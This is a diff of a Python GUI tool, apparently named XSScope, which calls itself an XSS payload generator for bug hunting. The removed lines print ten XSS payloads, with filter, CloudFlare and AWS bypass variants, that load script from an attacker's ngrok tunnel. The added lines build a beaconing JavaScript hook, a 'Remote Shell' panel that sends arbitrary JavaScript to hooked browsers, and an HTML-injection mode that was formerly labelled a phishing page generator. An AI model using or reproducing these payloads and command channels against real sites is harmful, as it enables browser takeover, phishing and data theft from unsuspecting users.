@@ -18,20 +18,6 @@ import base64
 import os
 from multiprocessing import Process
 
-#SETTING UP A NGROK
-with open('config/ngrok_authtoken.txt', 'r') as authtoken:
-    ngrok_authtoken = authtoken.read()
-if ngrok_authtoken == "paste_ngrok_authtoken_here":
-    tkinter.messagebox.showerror("Setup Error", "Because of the first setup, you have to paste your Ngrok Authtoken in /config/ngrok_authtoken.txt")
-
-# open a http tunnel on port 1337
-tcp_server = ngrok.connect(1337, "tcp")
-tcp_server = str(tcp_server[6:])
-
-#dividing IP and PORT in output displaying in each respective Entry
-tcp_server_ip = str(tcp_server[:-6])
-tcp_server_port = str(tcp_server[15:])
-
 # license
 about_software = '''XSScope is a XSS payload generator platform with an aim of increaing the impact of an XSS during Bug Hunting. Using all modules that XSScope offers, advanced XSS can be simply use with 1 click.
 Note: The creator of this software is not responsible for any ilegal activity or any damage that this software might cause. Use it on your own risk!'''
@@ -65,10 +51,12 @@ def about():
 #customise + design of GUI
 def agent_module():
     root1 = tk.Toplevel()
-    root1.title("XSScope - XSS Agent Module")
+    root1.title("XSScope v2.1 - Customise your attack")
     root1.geometry('1045x410')
     #root1.iconbitmap('x_logo_VYw_icon.ico')
     root1.resizable(0,0)
+
+    global tcp_server, tcp_server_ip, tcp_server_port
 
     xss_keylogger_var = tk.IntVar()
     xss_screenshot_var = tk.IntVar()
@@ -151,11 +139,8 @@ http://canyouseeme.org
             image_URL_loader.config(state="disabled")
             image_URL_text.configure(state="disabled")
 
-    def load_server():
-        global tcp_server
-        tcp_server = str(ip_dns.get()) + ":" + str(port.get())
-
     def xss_build():
+        global tcp_server, tcp_server_ip, tcp_server_port
         #defining the codes which will be added based on what user entered
         loading_bar['value'] = 0
         root1.update_idletasks()
@@ -449,28 +434,7 @@ link.click();
 
         except:
             loading_bar['value'] = 100
-            root1.update_idletasks()
-
-    #network settings frame root1_frame
-    root1_frame = LabelFrame(root1, text="Network Settings")
-    root1_frame.place(x=5, y=0)
-
-    ip_dns_text = tk.Label(root1_frame, text="IP/DNS: ")
-    ip_dns_text.grid(row=0, column=0)
-
-    port_text = tk.Label(root1_frame, text="PORT: ")
-    port_text.grid(row=0, column=2)
-
-    ip_dns = tk.Entry(root1_frame, width=30)
-    ip_dns.insert(END, tcp_server_ip)
-    ip_dns.grid(row=0, column=1)
-
-    port = tk.Entry(root1_frame, width=10)
-    port.insert(END, tcp_server_port)
-    port.grid(row=0, column=3)
-
-    load_server_button = tk.Button(root1_frame, text="Load server", command=load_server)
-    load_server_button.grid(row=0, column=4)
+            root1.update_idletas
 
     help_frame = LabelFrame(root1, text="")
     help_frame.place(x=685, y=14)
@@ -569,17 +533,6 @@ link.click();
     build_payload_button = tk.Button(root5_frame, text="Build the payload", command=xss_build)
     build_payload_button.grid(row=0, column=1)
 
-    def quit5():
-        tk.Toplevel().quit()
-
-    menubar_p = Menu(root1)
-    filemenu_p = Menu(menubar_p, tearoff=0)
-    filemenu_p.add_command(label="XSS Payloads", command=show_payload)
-    filemenu_p.add_separator()
-    filemenu_p.add_command(label="Quit", command=quit5)
-    menubar_p.add_cascade(label="Main", menu=filemenu_p)
-
-    root1.config(menu=menubar_p)
     root1.mainloop()
 
 def check_update():
@@ -614,16 +567,18 @@ def check_update():
 
 def show_payload():
     root3 = tk.Toplevel()
-    root3.title("XSScope v.1.7 - All XSS Payloads")
+    root3.title("XSScope v.2.1 - All XSS Payloads")
     root3.geometry('750x580')
     #root3.iconbitmap('x_logo_VYw_icon.ico')
     root3.resizable(0, 0)
+
+    global tcp_server, tcp_server_ip, tcp_server_port
 
     main_frame10 = LabelFrame(root3, text="")
     main_frame10.place(x=5, y=0)
 
     def quit3():
-        tk.Toplevel().quit()
+        root3.destroy()
 
 #work on this function to copy payload in clipboard
     def copy_payload1():
@@ -809,219 +764,15 @@ def show_payload():
 
 def phishing_website():
     root4 = tk.Toplevel()
-    root4.title("XSScope v.1.7 - Phishing Website Generator")
+    root4.title("XSScope v.2.1 - Inject HTML Code")
     root4.geometry('1000x1000')
     root4.resizable(0, 0)
     # root4.iconbitmap('x_logo_VYw_icon.ico')
 
+    global tcp_server, tcp_server_ip, tcp_server_port
+
     def quit4():
-        tk.Toplevel().quit()
-
-    def show_payloads_html():
-        root3_html = tk.Toplevel()
-        root3_html.title("XSScope v.1.7 - All XSS Payloads for generated HTML code")
-        root3_html.geometry('750x580')
-        # root3_html.iconbitmap('x_logo_VYw_icon.ico')
-        root3_html.resizable(0, 0)
-
-        main_frame10_html = LabelFrame(root3_html, text="")
-        main_frame10_html.place(x=5, y=0)
-
-        # work on this function to copy payload in clipboard
-        def copy_payload1_html():
-            pyperclip.copy(payload1_html)
-
-        def copy_payload2_html():
-            pyperclip.copy(payload2_html)
-
-        def copy_payload3_html():
-            pyperclip.copy(payload3_final_html)
-
-        def copy_payload4_html():
-            pyperclip.copy(payload4_html)
-
-        def copy_payload5_html():
-            pyperclip.copy(payload5_html)
-
-        def copy_payload6_html():
-            pyperclip.copy(payload6_html)
-
-        def copy_payload7_html():
-            pyperclip.copy(payload7_html)
-
-        def copy_payload8_html():
-            pyperclip.copy(payload8_html)
-
-        def copy_payload9_html():
-            pyperclip.copy(payload9_html)
-
-        def copy_payload10_html():
-            pyperclip.copy(payload10_final_html)
-
-        # generating all XSS payloads
-
-        payload3_script_html = 'var a=document.createElement("script");a.src="http://' + tcp_server + '/custom.js' + '";document.body.appendChild(a);'
-        payload3_b64 = str(base64.b64encode(payload3_script_html.encode('utf-8')))
-        payload3_html = str(payload3_b64.split("b'")[1])
-        payload3_html = str(payload3_html[:-1])
-        payload3_html = str(payload3_html[:-2])
-
-        cloudflare_bypass = "&Tab;"  # needed for payload 8
-
-        payload1_html = '<script src="http://' + tcp_server + '/custom.js"></script>'
-
-        payload10_script_html = str(base64.b64encode(payload1_html.encode('utf-8')))
-        payload10_html = str(payload10_script_html.split("b'")[1])
-
-        payload2_html = """javascript:eval('var a=document.createElement(\'script\');a.src=\'http://""" + tcp_server + """/custom.js\';document.body.appendChild(a)')"""
-        payload3_final_html = '"><input onfocus=eval(atob(this.id)) id=' + payload3_html + '&#61;&#61; autofocus>'
-        payload4_html = '"><img src=x id=' + payload3_html + '&#61;&#61; onerror=eval(atob(this.id))>'
-        payload5_html = '"><video><source onerror=eval(atob(this.id)) id=' + payload3_html + '&#61;&#61;>'
-        payload6_html = '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + tcp_server + '/custom.js");a.send();</script>'
-        payload7_html = '<script>$.getScript("//' + tcp_server + '/custom.js")</script>'
-        payload8_html = "<iframe src=h" + cloudflare_bypass + "t" + cloudflare_bypass + "t" + cloudflare_bypass + "p" + cloudflare_bypass + ":" + cloudflare_bypass + "/" + cloudflare_bypass + "/" + cloudflare_bypass + \
-                   list(tcp_server)[0] + cloudflare_bypass + list(tcp_server)[1] + cloudflare_bypass + list(tcp_server)[
-                       2] + cloudflare_bypass + list(tcp_server)[3] + cloudflare_bypass + list(tcp_server)[
-                       4] + cloudflare_bypass + list(tcp_server)[5] + cloudflare_bypass + list(tcp_server)[
-                       6] + cloudflare_bypass + list(tcp_server)[7] + cloudflare_bypass + list(tcp_server)[
-                       8] + cloudflare_bypass + list(tcp_server)[9] + cloudflare_bypass + list(tcp_server)[
-                       10] + cloudflare_bypass + list(tcp_server)[11] + cloudflare_bypass + list(tcp_server)[
-                       12] + cloudflare_bypass + list(tcp_server)[13] + cloudflare_bypass + list(tcp_server)[
-                       14] + cloudflare_bypass + list(tcp_server)[15] + cloudflare_bypass + list(tcp_server)[
-                       16] + cloudflare_bypass + list(tcp_server)[17] + cloudflare_bypass + list(tcp_server)[
-                       18] + cloudflare_bypass + list(tcp_server)[
-                       19] + cloudflare_bypass + "/" + cloudflare_bypass + "c" + cloudflare_bypass + "u" + cloudflare_bypass + "s" + cloudflare_bypass + "t" + cloudflare_bypass + "o" + cloudflare_bypass + "m" + cloudflare_bypass + "." + cloudflare_bypass + "j" + cloudflare_bypass + "s" + cloudflare_bypass + "></iframe>"
-        payload9_html = '">' + str(payload1_html)
-        payload10_final_html = "<svg/onload=eval(atob('" + payload10_html + "))>"
-
-        # save to intruder file
-        intruder_content_html = payload1_html + "\n" + payload2_html + "\n" + payload3_final_html + "\n" + payload4_html + "\n" + payload5_html + "\n" + payload6_html + "\n" + payload7_html + "\n" + payload8_html + "\n" + payload9_html + "\n" + payload10_final_html
-
-        def directory_save_html():
-            intruder_html = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".txt")
-            if intruder_html is None:  # asksaveasfile return `None` if dialog closed with "cancel".
-                return
-            intruder_html.write(intruder_content_html)
-            intruder_html.close()
-
-        # customising the Tab for all payloads
-
-        introduction_text = tk.Label(main_frame10_html,
-                                     text="The following payloads are used for the generated HTML codes.")
-        introduction_text.grid(row=0, column=0)
-
-        main_frame11_html = LabelFrame(root3_html, text="")
-        main_frame11_html.place(x=5, y=40)
-
-        payload1_text = tk.Label(main_frame11_html, text="Basic Tag Payload: ")
-        payload1_text.grid(row=0, column=0)
-
-        payload1_entry = tk.Entry(main_frame11_html, width=76)
-        payload1_entry.insert(END, payload1_html)
-        payload1_entry.grid(row=1, column=0)
-
-        copy_payload1 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload1_html)  # add command
-        copy_payload1.grid(row=1, column=1)
-
-        payload2_text = tk.Label(main_frame11_html, text="URI Payload (Use where URI's are taken as input): ")
-        payload2_text.grid(row=2, column=0)
-
-        payload2_entry = tk.Entry(main_frame11_html, width=76)
-        payload2_entry.insert(END, payload2_html)
-        payload2_entry.grid(row=3, column=0)
-
-        copy_payload2 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload2_html)  # add command
-        copy_payload2.grid(row=3, column=1)
-
-        payload3_text = tk.Label(main_frame11_html, text="Tag Payload (Bypassing Blacklist system): ")
-        payload3_text.grid(row=4, column=0)
-
-        payload3_entry = tk.Entry(main_frame11_html, width=76)
-        payload3_entry.insert(END, payload3_final_html)
-        payload3_entry.grid(row=5, column=0)
-
-        copy_payload3 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload3_html)  # add command
-        copy_payload3.grid(row=5, column=1)
-
-        payload4_text = tk.Label(main_frame11_html, text="Tag Payload (Use when <script> tags are filtered): ")
-        payload4_text.grid(row=6, column=0)
-
-        payload4_entry = tk.Entry(main_frame11_html, width=76)
-        payload4_entry.insert(END, payload4_html)
-        payload4_entry.grid(row=7, column=0)
-
-        copy_payload4 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload4_html)  # add command
-        copy_payload4.grid(row=7, column=1)
-
-        payload5_text = tk.Label(main_frame11_html, text="Tag Payload (HTML5 payload): ")
-        payload5_text.grid(row=8, column=0)
-
-        payload5_entry = tk.Entry(main_frame11_html, width=76)
-        payload5_entry.insert(END, payload5_html)
-        payload5_entry.grid(row=9, column=0)
-
-        copy_payload5 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload5_html)  # add command
-        copy_payload5.grid(row=9, column=1)
-
-        payload6_text = tk.Label(main_frame11_html, text="Payload for exploitation of webapp with CSP: ")
-        payload6_text.grid(row=10, column=0)
-
-        payload6_entry = tk.Entry(main_frame11_html, width=76)
-        payload6_entry.insert(END, payload6_html)
-        payload6_entry.grid(row=11, column=0)
-
-        copy_payload6 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload6_html)  # add command
-        copy_payload6.grid(row=11, column=1)
-
-        payload7_text = tk.Label(main_frame11_html, text="Payload for websites that include JQuery: ")
-        payload7_text.grid(row=12, column=0)
-
-        payload7_entry = tk.Entry(main_frame11_html, width=76)
-        payload7_entry.insert(END, payload7_html)
-        payload7_entry.grid(row=13, column=0)
-
-        copy_payload7 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload7_html)  # add command
-        copy_payload7.grid(row=13, column=1)
-
-        payload8_text = tk.Label(main_frame11_html, text="Tag Payload (CloudFlare Bypassing): ")
-        payload8_text.grid(row=14, column=0)
-
-        payload8_entry = tk.Entry(main_frame11_html, width=76)
-        payload8_entry.insert(END, payload8_html)
-        payload8_entry.grid(row=15, column=0)
-
-        copy_payload8 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload8_html)  # add command
-        copy_payload8.grid(row=15, column=1)
-
-        payload9_text = tk.Label(main_frame11_html, text="Tag Payload (AWS Bypassing): ")
-        payload9_text.grid(row=16, column=0)
-
-        payload9_entry = tk.Entry(main_frame11_html, width=76)
-        payload9_entry.insert(END, payload9_html)
-        payload9_entry.grid(row=17, column=0)
-
-        copy_payload9 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload9_html)  # add command
-        copy_payload9.grid(row=17, column=1)
-
-        payload10_text = tk.Label(main_frame11_html, text="Base64-Encoded Payload: ")
-        payload10_text.grid(row=18, column=0)
-
-        payload10_entry = tk.Entry(main_frame11_html, width=76)
-        payload10_entry.insert(END, payload10_final_html)
-        payload10_entry.grid(row=19, column=0)
-
-        copy_payload10 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload10_html)  # add command
-        copy_payload10.grid(row=19, column=1)
-
-        menubar1_html = Menu(root3_html)
-        filemenu1_html = Menu(menubar1_html, tearoff=0)
-        filemenu1_html.add_command(label="Save all payloads", command=directory_save_html)
-        # filemenu1_html.add_separator()
-        filemenu1_html.add_command(label="Exit", command=quit4)
-        menubar1_html.add_cascade(label="Main", menu=filemenu1_html)
-
-        root3_html.config(menu=menubar1_html)
-        root3_html.mainloop()
+        root4.destroy()
 
     def add_html_code():
         html_payload_code = str(html_code.get("1.0",END))
@@ -1045,7 +796,7 @@ def phishing_website():
         final_asci_code2 = "document.documentElement.innerHTML=String.fromCharCode(" + final_asci_code1 + ")"
 
         #script to save into /custom.js
-        built_html_payload = open("custom.js", "w")
+        built_html_payload = open("xsscope.js", "w")
         built_html_payload.write(final_asci_code2)
         built_html_payload.close()
 
@@ -1224,7 +975,6 @@ def phishing_website():
     filemenu2 = Menu(menubar2, tearoff=0)
     filemenu2.add_command(label="Import code from file", command=import_html)
     filemenu2.add_separator()
-    filemenu2.add_command(label="XSS Payloads", command=show_payloads_html)
     filemenu2.add_command(label="Exit", command=quit4)
     menubar2.add_cascade(label="Main", menu=filemenu2)
 
@@ -1232,22 +982,38 @@ def phishing_website():
     root4.mainloop()
 
 def reverse_shell():
-    server_conf = open("config/tcpserver_domain.txt", "r")
-    if str(server_conf.read()) == "paste_.localhost_run_domain_here":
-        tkinter.messagebox.showinfo("First Setup Guidance", "This is your first setup, please copy the domain URL from terminal (Correct format: server-3457e3c8.localhost.run) and paste in on /config/tcpserver_domain.txt")
-    else:
-        os.system("gnome-terminal -- /bin/sh -c 'python3 reverse_shell.py; exec bash'")
-        os.system('''xfce4-terminal -e 'bash -c "python3 reverse_shell.py; bash"' -T "XSScope - Reverse Shell Panel"''')
+    root6 = tk.Tk()
+    root6.title("XSScope v.2.1 - Remote Shell")
+    root6.geometry('580x70')
+    root6.resizable(0,0)
 
-def main():
+    shell_frame = LabelFrame(root6, text="Execute Javascript Command")
+    shell_frame.place(x=5, y=5)
+
+    remote_shell_command = tk.Entry(shell_frame, width=60)
+    remote_shell_command.grid(row=0, column=0)
+
+    def exec_js():
+        command_exec = str(remote_shell_command.get())
+        hook_file = open("xsscope.js", "w")
+        hook_file.write(command_exec)
+        hook_file.close()
+
+    execute_command = tk.Button(shell_frame, text="Execute", command=exec_js)
+    execute_command.grid(row=0, column=1)
+
+def main1():
     #setting up the whole gui properties
     root = tk.Tk()
-    root.title("XSScope v.1.7")
+    root.title("XSScope v.2.1")
     root.geometry('410x100')
     #root.iconbitmap('x_logo_VYw_icon.ico')
     root.resizable(0,0)
     #end of the gui propertie
     #print the welcoming message in the terminal/cmd
+
+    global tcp_server, tcp_server_ip, tcp_server_port
+    global beacon_interval
 
     # main frames
     main_frame = LabelFrame(root, text="Ngrok Server Information")
@@ -1290,11 +1056,33 @@ def main():
     php_port_output.configure(state="readonly")
     php_port_output.grid(row=0, column=3)
 
+    #creating a hook script on the background
+    hook_js_code = """function connectLoader(retval) {
+    var URL= 'http://""" + tcp_server + """/xsscope.js';
+    var scriptTag = document.getElementById('loadScript');
+    var head = document.getElementsByTagName('head').item(0);
+    if(scriptTag) head.removeChild(scriptTag);
+    var script = document.createElement('script');
+    script.src = URL;
+    script.type = 'text/javascript';
+    script.id = 'loadScript';
+    head.appendChild(script);
+}
+setInterval('connectLoader()',""" + beacon_interval + """);
+
+"""
+
+    hook_file = open("xsscope.js", "w")
+    hook_file.write(hook_js_code)
+    hook_file.close()
+    #hook javascript file successfully created and ready to perform attack
+
     #customising the Menu
     menubar = Menu(root)
     filemenu = Menu(menubar, tearoff=0)
+    filemenu.add_command(label="XSS Payloads", command=show_payload)
     filemenu.add_command(label="Agent Module", command=agent_module)
-    filemenu.add_command(label="Add HTML code", command=phishing_website)
+    filemenu.add_command(label="Inject HTML code", command=phishing_website)
     filemenu.add_command(label="Reverse Shell", command=reverse_shell)
     filemenu.add_separator()
     filemenu.add_command(label="Check for update", command=check_update)
@@ -1312,18 +1100,123 @@ def main():
     root.config(menu=menubar)
     root.mainloop()
 
+def main():
+    root_main = tk.Tk()
+    root_main.title("Connect")
+    root_main.geometry('410x260')
+    # root.iconbitmap('x_logo_VYw_icon.ico')
+    root_main.resizable(0, 0)
+
+    #defining the string and int variables
+    setup_var = tk.IntVar()
+
+    connect_frame = tk.LabelFrame(root_main, text="")
+    connect_frame.place(x=5, y=5)
+
+    connect_label = tk.Label(connect_frame, text="This is the connect dialog. Before opening XSScope, choose \nhow you want to connect.")
+    connect_label.grid(row=0, column=0)
+
+    setup_frame = tk.Label(root_main, text="")
+    setup_frame.place(x=5, y=50)
+
+    def config_opt():
+        if setup_var.get() == 2:
+            server_ip_label.configure(state="normal")
+            server_ip_entry.config(state="normal")
+            server_port_label.config(state="normal")
+            server_port_entry.config(state="normal")
+        elif setup_var.get() == 1:
+            server_ip_entry.delete(0, END)
+            server_port_entry.delete(0, END)
+            server_ip_label.configure(state="disabled")
+            server_ip_entry.config(state="disabled")
+            server_port_label.config(state="disabled")
+            server_port_entry.config(state="disabled")
+
+    automatic_setup = tk.Radiobutton(setup_frame,text="Automatic server setup",variable=setup_var,value=1, command=config_opt)
+    automatic_setup.grid(row=1, column=0)
+    manual_setup = tk.Radiobutton(setup_frame,text="Manual server setup     ",variable=setup_var,value=2, command=config_opt)
+    manual_setup.grid(row=2, column=0)
+
+    button_frame = tk.LabelFrame(root_main, text="")
+    button_frame.place(x=115, y=220)
+
+    #frame for manual setup
+    manual_setup_frame = LabelFrame(root_main, text="Manual Server Configuration")
+    manual_setup_frame.place(x=5, y=100)
+
+    server_ip_label = tk.Label(manual_setup_frame, text="Server IP: ")
+    server_ip_label.grid(row=0, column=0)
+
+    server_ip_entry = tk.Entry(manual_setup_frame, width=38)
+    server_ip_entry.grid(row=0,column=1)
+
+    server_port_label = tk.Label(manual_setup_frame, text="Server Port: ")
+    server_port_label.grid(row=1, column=0)
+
+    server_port_entry = tk.Entry(manual_setup_frame, width=38)
+    server_port_entry.grid(row=1, column=1)
+
+    #beacon config frame
+    beacon_frame = tk.LabelFrame(root_main, text="")
+    beacon_frame.place(x=5, y=175)
+
+    beacon_interval_label = tk.Label(beacon_frame, text="Set beacon interval (ms)*: ")
+    beacon_interval_label.grid(row=0, column=0)
+
+    beacon_interval_entry = tk.Entry(beacon_frame, width=10)
+    beacon_interval_entry.grid(row=0, column=1)
+
+    beacon_interval_entry.insert(END, '10000')
+
+    def start_xsscope():
+        global tcp_server
+        global tcp_server_ip
+        global tcp_server_port
+        global beacon_interval
+        beacon_interval = str(beacon_interval_entry.get())
+        if setup_var.get() == 1:
+            # SETTING UP A NGROK
+            with open('config/ngrok_authtoken.txt', 'r') as authtoken:
+                ngrok_authtoken = authtoken.read()
+            if ngrok_authtoken == "paste_ngrok_authtoken_here" or ngrok_authtoken == "":
+                tkinter.messagebox.showerror("Setup Error",
+                                             "Because of the first setup, you have to paste your Ngrok Authtoken in /config/ngrok_authtoken.txt")
+
+            # open a http tunnel on port 1337
+            tcp_server = ngrok.connect(1337, "tcp")
+            tcp_server = str(tcp_server[6:])
+
+            # dividing IP and PORT in output displaying in each respective Entry
+            tcp_server_ip = str(tcp_server[:-6])
+            tcp_server_port = str(tcp_server[15:])
+            root_main.destroy()
+            main1()
+        elif setup_var.get() == 2:
+            tcp_server_ip = str(server_ip_entry.get())
+            tcp_server_port = str(server_port_entry.get())
+            tcp_server = tcp_server_ip + ":" + tcp_server_port
+            root_main.destroy()
+            main1()
+
+    def help_connect():
+        webbrowser.open("https://github.com/kleiton0x00/XSScope/wiki",new=1)
+
+    connect_button = tk.Button(button_frame, text="Connect", command=start_xsscope)
+    connect_button.grid(row=0, column=0)
+
+    help_button = tk.Button(button_frame, text="Help", command=help_connect)
+    help_button.grid(row=0, column=1)
+
+    #end of connect gui
+    root_main.mainloop()
+
 def php_server():
     os.system('php -S localhost:1337 >/dev/null')
 
-def tcp_server_setup():
-    os.system('ssh -R 80:localhost:1338 ssh.localhost.run')
-
 #starting the threads
-thread_2=Process(target=tcp_server_setup)
+thread_2=Process(target=php_server)
 thread_2.start()
-
-thread_3=Process(target=php_server)
-thread_3.start()
 
 thread_1 = Process(target=main)
 thread_1.start()
@@ -1331,4 +1224,3 @@ thread_1.start()
 #closing threads
 thread_2.join()
 thread_1.join()
-thread_3.join()
